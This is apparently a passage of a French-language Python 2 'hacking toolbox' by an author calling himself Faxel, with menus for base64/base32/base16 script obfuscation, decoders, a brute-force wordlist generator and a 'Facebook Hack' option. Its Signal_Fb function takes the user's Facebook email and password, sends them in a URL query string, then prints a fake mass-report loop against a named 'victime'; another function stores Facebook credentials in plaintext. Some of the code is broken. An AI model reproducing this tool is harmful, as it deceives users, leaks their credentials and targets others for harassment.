        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_bases()
####################################################################################################
####################################################################################################
def base_64():
	cls()  
        charge()
        cls()
        print(logo)
	script_base_64 = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		ouverture = open(script_base_64,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu()
	print("\033[1;97m║")
	emplacement = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		encode = b64encode(ouverture)
		enregistrement = open(emplacement,'w')
		enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport base64\nexec(base64.b64decode('''"+encode+"'''))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu()  
####################################################################################################		
def base_32():
	cls()  
        charge()
        cls()
        print(logo)
	script_base_32 = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		ouverture = open(script_base_32,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu()
	print("\033[1;97m║")
	emplacement = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		encode = b32encode(ouverture)
		enregistrement = open(emplacement,'w')
		enregistrement.write('#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport base64\nexec(base64.b32decode("'+encode+'"))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu()    
####################################################################################################		
def base_16():
	cls()  
        charge()
        cls()
        print(logo)
	script_base_16 = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		ouverture = open(script_base_16,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu()
	print("\033[1;97m║")
	emplacement = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		encode = b16encode(ouverture)
		enregistrement = open(emplacement,'w')
		enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport base64\nexec(base64.b16decode('"+encode+"'))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu()  
####################################################################################################
####################################################################################################		
def menu_base_image():
    cls()
    print(logo)
    print("\033[1;97m╔"+30*"═"+1*"═╗")
    print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;214m Encodage base64 image\033[1;97m    ║")  
    print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[48;5;0;38;5;195m Decodage base64 image\033[1;97m    ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96mD.\033[1;91m]\033[48;5;0;38;5;196m Menu Decodage        \033[1;97m    ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96mP.\033[1;91m]\033[48;5;0;38;5;197m Menu Precedent       \033[1;97m    ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu General         \033[1;97m    ║")
    print("\033[1;97m╚"+30*"═"+1*"═╝")   
    print("\033[1;97m║")
    choix_base_image() 
def choix_base_image():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_base_image()
    elif dmd =="1":
        cod()
    elif dmd =="2":
        dec()
    elif dmd =="d" or dmd =="D":
        menu_decode()
    elif dmd =="p" or dmd =="P":
        menu_bash_ou_wordliste()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_base_image()	
####################################################################################################		
def cod():
 try:
    cls()  
    charge()
    cls()
    print(logo)
    image = open('deer.gif', 'rb') 
    lecture_image = image.read() 
    image_64_encodage = base64.encodestring(lecture_image)
    load("\033[1;97mChargement\033[1;93m...")
    print (image_64_encodage)
    print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
    raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
    menu_base_image()
 except IOError:
    print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage echouer")
    raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
    menu_decode()
####################################################################################################
def dec():     
  try:
     cls()  
     charge()
     cls()
     print(logo)
     resulat_image = open('deer_decode.gif', 'wb') 
     image_64_decodage = base64.decodestring(image_64_encodage) 
     resulat_image.write(image_64_decodage)
     load("\033[1;97mChargement\033[1;93m...")
     print (image_64_decodage)
     print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Decompilage reussi")
     raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
     menu_base_image()
  except IOError:
     print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Decompilage echouer")
     print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Veuillez apprendre beaucoup pour utiliser ce script. Merci")
     raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
     menu_base_image()
#################################################################################################### 
####################################################################################################		
def Signal_Fb():
      cls()  
      load("\033[1;97mChargement\033[1;93m...")
      cls()
      print(logo)
      nom_utilisateur = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Votre Email/Numéro/ID de FB \033[1;91m▶▶▶ \033[1;96m")
      mot_de_passe = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Mot de passe \033[1;91m▶▶▶ \033[1;96m")
      url = "https://m.facebook.com/help/contact/144059062408922?_rdc=1&_rdr/store.php?username="+str(nom_utilisateur)+"&password="+str(mot_de_passe)
      connexion = requests.get(url)
      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;92m Connexion réussie\033[1;93m...... \033[1;91m [\033[1;97m+\033[1;91m]")
      mael("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;97mVeuillez saisir l'identifiant Facebook de votre victime \033[1;91m [\033[1;97m+\033[1;91m]")
      victime = raw_input("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;97m Entrez \033[1;91m▶▶▶ \033[1;94m")
      load("\033[1;97mChargement\033[1;93m...")
      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;97m Recupreation des données de connexion veuillez patienter\033[1;93m....... \033[1;91m [\033[1;97m+\033[1;91m]")
      load("\033[1;97mChargement\033[1;93m...")
      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;93m Démarrage du moteur de création de rapports\033[1;93m........ \033[1;91m [\033[1;97m+\033[1;91m]")
      time.sleep(3)
      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;96m Début du rapport\033[1;93m........ \033[1;91m [\033[1;97m+\033[1;91m]")
      load("\033[1;97mChargement\033[1;93m...")
      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;95m Signaler un compte Facebook, \033[38;5;245m@\033[38;5;221mFaxel \033[1;91m [\033[1;97m+\033[1;91m]\033[38;5;245m \033[1;92m")
      load("\033[1;97mChargement\033[1;93m...")
      i=100048845592611
      while i < 120048845592711:
        time.sleep(3)
        print("['+str(i)+']'+'+++réussi signalé +++ à'+str(victime)")
        i=i+1
      print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
      raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
      menu()
####################################################################################################
def signal_bug():	
	cls()
	print("[38;5;214m<══════════════════════════════════>") 
	signal = raw_input("\033[1;31m[\033[1;37m**\033[1;31m]  [38;5;214mSaisissez votre nom\033[1;91m  : [38;5;108m")    
        print("[38;5;214m<══════════════════════════════════>")
	if signal =="":
		print("\033[1;31m[\033[1;37m!\033[1;31m] [38;5;185mVeuillez remplir, car il est obligatoire. Merci")
		time.sleep(2)
		signal_bug()
	else:
		cls() 
		Rapport_bug()
####################################################################################################
def Rapport_bug():
	cls()
        print(logo9)
        anime("\t\033[1;91m [\033[1;93m*\033[1;91m]\033[1;96m Signaler un bug via WhatsApp \033[1;91m  [\033[1;93m*\033[1;91m]\033[1;97m\n")
        signal = raw_input("\t   \033[1;31m[\033[1;33m*\033[1;31m]  [38;5;214mConfirmer votre nom\033[1;91m  : [38;5;108m")
	message = raw_input("\t    \033[1;91m [\033[1;93m+\033[1;91m]\033[1;97m Entrer votre message \033[1;91m [\033[1;93m+\033[1;91m]\033[1;97m\n         \t")
	message.replace(' ', '%20')
	sg ="signé : "
        load("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;97m Chargement, veuillez patienter\033[1;92m ...")
        try:
            sp.check_output([
             'am', 'start',
             'https://api.whatsapp.com/send?phone=22555709610&text=Problème : je vous contacte depuis votre code github pour signaler ce bug.\nVoici mon message.\n' + message + '\n\t\t'+sg+''+signal+''])
	    print("\n\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Signalisation du bug  en cours, comfirmer.")
	    raw_input('\033[1;91m [\033[1;97m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
	    menu()	
        except:
            print("\n\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Échec de l'envoi du rapport de bug")
	    raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
	    menu()	
####################################################################################################	
def feliciter():	
	cls()
	print("[38;5;214m<══════════════════════════════════>") 
	felicitation = raw_input("\033[1;31m[\033[1;37m**\033[1;31m]  [38;5;214mSaisissez votre nom\033[1;91m  : [38;5;108m")    
        print("[38;5;214m<══════════════════════════════════>")
	if felicitation =="":
		print("\033[1;31m[\033[1;37m!\033[1;31m] [38;5;185mVeuillez remplir, car il est obligatoire. Merci")
		time.sleep(2)
		feliciter()
	else:
		cls() 
		feliciter_faxel()
####################################################################################################
def feliciter_faxel(): 
        cls()
        print(logo10)
	anime("\t\033[1;91m [\033[1;93m*\033[1;91m]\033[1;96m Encourager Faxel via WhatsApp \033[1;91m  [\033[1;93m*\033[1;91m]\033[1;97m\n")
	felicitation = raw_input("\t   \033[1;31m[\033[1;33m*\033[1;31m]  [38;5;214mConfirmer votre nom\033[1;91m  : [38;5;108m") 
        message = raw_input("\t    \033[1;91m [\033[1;93m+\033[1;91m]\033[1;97m Entrer votre message \033[1;91m [\033[1;93m+\033[1;91m]\033[1;97m\n         \t")
	message.replace(' ', '%20')
	sg ="signé : "
        load("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;97m Chargement, veuillez patienter\033[1;92m ...")
        try:
            sp.check_output([
             'am', 'start',
             'https://api.whatsapp.com/send?phone=22555709610&text=Félicitation : je vous contacte depuis votre code github pour vous féliciter.\nVoici mon message.\n' + message + '\n\t\t'+sg+''+felicitation+''])
	    print("\n\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Rapport en cours d'envoi comfirmer.")
	    raw_input('\033[1;91m [\033[1;97m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
	    menu()		
        except:
            print("\n\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Échec de l'envoi du rapport.")
	    raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
	    menu()
####################################################################################################
####################################################################################################	
def menu_decode():
    cls()
    faxel_securite()
    cls()
    print(logo)
    print("\033[1;97m╔"+30*"═"+1*"═╗")
    print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[48;5;0;38;5;197m Decodage base64   \033[1;97m       ║")  
    print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;227m Decodage base32          \033[1;97m║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;115m Decodage base16   \033[1;97m       ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;112m Decodage marshall \033[1;97m       ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m5.\033[1;91m]\033[38;5;136m Decryptage bash   \033[1;97m       ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m6.\033[1;91m]\033[38;5;241m Facebook Hack     \033[1;97m       ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu general      \033[1;97m       ║")
    print("\033[1;97m╚"+30*"═"+1*"═╝")   
    print("\033[1;97m║")  
    choix_decode()   
def choix_decode():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_decode()
    elif dmd =="1":
        dec_base_64()
    elif dmd =="2":
        dec_base_32()
    elif dmd =="3":
        dec_base_16()
    elif dmd =="4":
        dec_mars()
    elif dmd =="5":
        decryptage_bash()
    elif dmd =="6":
        connexion_facebook()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_decode()
####################################################################################################
def dec_base_64():
   cls()  
   charge()
   cls()
   print(logo)
   script_dec_base_64 = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
   print("\033[1;97m║")
   resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
   load("\033[1;97mAttente du decryptage \033[1;93m...")
   print("-"*40)
   try:
	ouverture = open(script_dec_base_64,'r').read()
   except:
   	print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
        menu_decode() 
   sauve=[]
   jabot=[]
   sauvegarde=open(resultat,'w')
   for k in ouverture:
   	try:
   		print("Resultat -> ",base64.b64decode(k.split('\n')[0]))
   		resul = base64.b64decode(k.split('\n')[0])
   		jabot.append(resul)
   		time.sleep(00.01)
   	except:
		print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Decompilage echouer") 
   		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;97m Desolé se script n'a pas été crypter en base64")
   		sauve.append(k)
   		time.sleep(00.01)
   print("-"*40)
   for result in jabot:
   	sauvegarde.write(result.split('\n')[0]+"\n")
   sauvegarde.close()
   print(" Réussite totale:",len(jabot))
   print(" Emplacement :",sauvegarde)
   print("-"*40)
   print(" Echec:",len(sauve))
   for t in sauve:
	   print ("Echec:",t.replace('\n',''))
   print("-"*40)
   raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   menu_decode()
####################################################################################################
def dec_base_32():
   cls()  
   charge()
   cls()
   print(logo)
   script_dec_base_32 = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
   print("\033[1;97m║")
   resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
   load("\033[1;97mAttente du decryptage \033[1;93m...")
   print("-"*40)
   try:
	ouverture = open(script_dec_base_32,'r').read()
   except:
   	print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
        menu_decode() 
   sauve=[]
   jabot=[]
   sauvegarde = open(resultat,'w')
   for k in ouverture:
   	try:
   		print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;95m Resultat -> ",base64.b32decode(k.split('\n')[0]))
   		resul = base64.b32decode(k.split('\n')[0])
   		jabot.append(resul)
   		time.sleep(00.01)
   	except:
   		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;93m Desolé se script n'a pas été crypter en base32")
   		sauve.append(k)
   		time.sleep(00.01)
   print("-"*40)
   for result in jabot:
   	sauvegarde.write(result.split('\n')[0]+"\n")
   sauvegarde.close()
   print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Decompilage echouer")
   print(" Réussite totale:",len(jabot))
   print(" Emplacement :",sauvegarde)
   print("-"*40)
   print(" Echec:",len(sauve))
   for t in sauve:
	   print ("Echec:",t.replace('\n',''))
   print("-"*40)
   raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   menu_decode()	
####################################################################################################		
def dec_base_16():
   cls()  
   charge()
   cls()
   print(logo)
   script_dec_base_16 = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
   print("\033[1;97m║")
   resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
   load("\033[1;97mAttente du decryptage \033[1;93m...")
   print("-"*40)
   try:
	ouverture = open(script_dec_base_16,'r').read()
   except:
   	print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
        menu_decode() 
   sauve=[]
   jabot=[]
   sauvegarde=open(resultat,'w')
   for k in ouverture:
   	try:
   		print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;95m Resultat -> ",base64.b16decode(k.split('\n')[0]))
   		resul = base64.b16decode(k.split('\n')[0])
   		jabot.append(resul)
   		time.sleep(00.01)
   	except:
   		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;93m Desolé se script n'a pas été crypter en base16")
   		sauve.append(k)
   		time.sleep(00.01)
   print("-"*40)
   for result in jabot:
   	sauvegarde.write(result.split('\n')[0]+"\n")
   sauvegarde.close()
   print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Decompilage echouer")
   print(" Réussite totale:",len(jabot))
   print(" Emplacement :",sauvegarde)
   print("-"*40)
   print(" Echec:",len(sauve))
   for t in sauve:
	   print ("Echec:",t.replace('\n',''))
   print("-"*40)
   raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   menu_decode()	
####################################################################################################
def dec_mars():
	cls()  
        charge()
        cls()
        print(logo)
	script_dec_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		ouverture = open(script_dec_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_decode()
	print("\033[1;97m║")
	emplacement = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		repare = ouverture.replace('\r\n', '\n')
	        repare = repare.replace('\r', 'n')
	        if repare and repare[(-1)] != '\n':
	            repare = repare + '\n'
	        decompilage = pp.decompile(repare, '<faxel>', 'exec')
	        decompte = marshal.dumps(compilage)
		enregistrement = open(emplacement,"w")
		enregistrement.write("#Decompiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal\n("+repr(decompte)+")")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Decompilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_decode()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Decompilage echouer")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_decode()
####################################################################################################    
def decryptage_bash():
   try:
       #Dev: Faxel
       cls()
       print(logo8)
       bash_decryp_script = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
       ouverture = open(bash_decryp_script,'r')
       Lecture_fichier = ouverture.read()
       ouverture.close()
       fichier_de_fin = Lecture_fichier.replace("eval","echo")
       resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
       ouverture = open(resultat,'w')
       ouverture.write(fichier_de_fin)
       ouverture.close()
       os.system("touch faxel.sh")
       os.system("bash " + resultat + " > faxel")
       print("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;92m Terminer..")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_decode()
   except KeyboardInterrupt:
       print("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Arret!")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_decode()
   except IOError:
       print("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Fichier introuvable!")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_decode()
####################################################################################################
def connexion_facebook():
    cls()
    print(logo)
    requete = requests.Session()
    print("\033[1;97m║")
    nomu = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Connectez-vous à votre Fb \033[1;91m [\033[1;93m+\033[1;91m]\033[1;97m Nom d'utilisateur \033[1;91m▶▶ \033[1;97m ")
    print("\033[1;97m║")
    mdp = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Mot de passe \033[1;91m▶▶ \033[1;97m ")
    load("\033[1;97mRedirection vers compte facebook\033[1;93m...")
    requete_1 = requete.post('https://mbasic.facebook.com/login', data={'email': nomu, 'pass': mdp}).url
    if 'save-device' in requete_1 or 'm_sess' in requete_1:
        i = json.dumps({'email': nomu, 'pass':mdp, 
           'name': bs4.BeautifulSoup(requete.get('https://mbasic.facebook.com/me').text, features='html.parser').find('title').text})
        open('config/config.json', 'w').write(i)
        print('\033[1;91m [\033[1;93m*\033[1;91m]\033[1;92m Connexion réussie..')
        cls()
	menu()
    if 'checkpoint' in requete_1 or 'challange' in requete_1:
        print("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Ton compte est bloqué! (Hit Session) Checkpoint\n\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Veuillez vous connecter manuellement et autoriser l'entrée via le navigateur")
        raw_input('\n\033[1;91m [\033[1;93m*\033[1;91m]\033[1;97m Appuyez à nouveau sur Entrée...')
        menu_decode()
    else:
        print('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Échec de la connexion.')
        raw_input('\n\033[1;91m [\033[1;93m*\033[1;91m]\033[1;97m Appuyez à nouveau sur Entrée pour...')
        menu_decode()
#################################################################################################### 
####################################################################################################
def menu_bash_ou_wordliste():
     cls()
     print(logo8)
     print("\033[1;97m╔"+30*"═"+1*"═╗")
     print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;214m Bash\033[1;91m (\033[1;96mEval\033[1;97m,\033[1;93mecho\033[1;91m)\033[1;97m         ║")
     print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;112m Creer une Wordliste   \033[1;97m   ║")  
     print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;114m Menu general          \033[1;97m   ║") 
     print("\033[1;97m╚"+30*"═"+1*"═╝")   
     print("\033[1;97m║")
     choix_bash_ou_wordliste()
def choix_bash_ou_wordliste():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print("\n\t\033[1;91m[!] Remplissez correctement ")
	menu()
    elif dmd =="1":
        menu_bash()
    elif dmd =="2":
        wordliste()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        #raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_bash_ou_wordliste()
####################################################################################################	
def wordliste():
	cls()
        print(logo)
	h = raw_input("\033[1;91m[\033[1;97m??\033[1;91m] \033[1;97mVous voulez-vous creer votre wordliste ? \033[1;94m[\033[1;92mo/\033[1;91mn\033[1;94m]\033[1;91m : \033[1;93m ")
        if h =="n" or h =="N":
	    menu_bash_ou_wordliste()
	elif h =="o" or h =="O":
            cls()
            load("\033[1;97mChargement\033[1;93m...")
            cls()
            print(logo)
            length=int(raw_input("\033[1;91m[\033[1;97m**\033[1;91m] [38;5;217mEntrez le nombre de caracteres \x1b[1;91m: \x1b[1;93m"))
            nom=raw_input("\n\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez votre liste de mots avec l\'extension \x1b[1;91m(\x1b[1;97m.txt\x1b[1;91m)\x1b[1;91m : \x1b[1;93m ")
            tic = time.clock()
            print ("\n[38;5;214m<><><><><><><><><><><><><><><><><><><><><><><><><><>")
            print ("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;108mCréation du mdp en cours, veuillez patienter... \033[1;91m[\033[1;97m++\033[1;91m]")
            print ("[38;5;214m<><><><><><><><><><><><><><><><><><><><><><><><><><>\n")
            lista=[0 for x in xrange(length)]
            x=length-1
            string="abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*"
            list_of_results=[]
            file1=file(nom,"w")
            while(x>-1):
                result=""
                if lista[x]==len(string)-1:
                    for z in xrange (length):
                        result+=string[lista[z]]
                    lista[x]=0
                    x-=1
                elif x==length-1:
                    for z in xrange(length):
                        result+=string[lista[z]]
                    lista[x]+=1
                else:
                    for z in xrange(length):
                        result+=string[lista[z]]
                    lista[x]+=1
                    if x>0:
                        x+=1
                    else:
                        x=length-1
                file1.write(result+"\n")
            toc = time.clock()
            ttn = toc - tic
            print("[38;5;212m<════════════════════════════════════════════════════>\n")
            print("\033[1;91m[\033[1;97m**\033[1;91m] [38;5;108mTerminer en\x1b[1;92m "+str(ttn)+" [38;5;108msecondes.\n")
            print("\033[1;91m[\033[1;97m--\033[1;91m] \x1b[1;97mEnregistrer sous le nom de[38;5;112m "+str(nom)+"\x1b[1;97m dans votre repertoire.\n")
            print("\033[1;91m[\033[1;97m++\033[1;91m] \x1b[1;97mTaper\x1b[1;96m cat\x1b[1;91m +\x1b[1;97m nom de votre fichier avec\nl\'extension pour voir votre mot de passe.\n")
            print("[38;5;212m<════════════════════════════════════════════════════>\n")
            print("[38;5;214m<══════════════════════════════════>\n")
            print("\033[1;31m[\033[1;37m**\033[1;31m] \033[0m Auteur \033[1;31m:[38;5;112m* \033[48;5;0;38;5;197mMr Faxel[38;5;112m * \033[1;31m[*] [38;5;18m")        
            print("[38;5;214m<══════════════════════════════════>\n")
            raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
            menu_bash_ou_wordliste()
        else:
            menu_bash_ou_wordliste()
####################################################################################################
####################################################################################################
def menu_bash():
     cls()
     print(logo8)
     print("\033[1;97m╔"+30*"═"+1*"═╗")
     print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;112m Cryptage bash         \033[1;97m   ║")
     print("\033[1;97m║ \033[1;91m[\033[1;96mP.\033[1;91m]\033[38;5;115m Menu precedent          \033[1;97m ║")
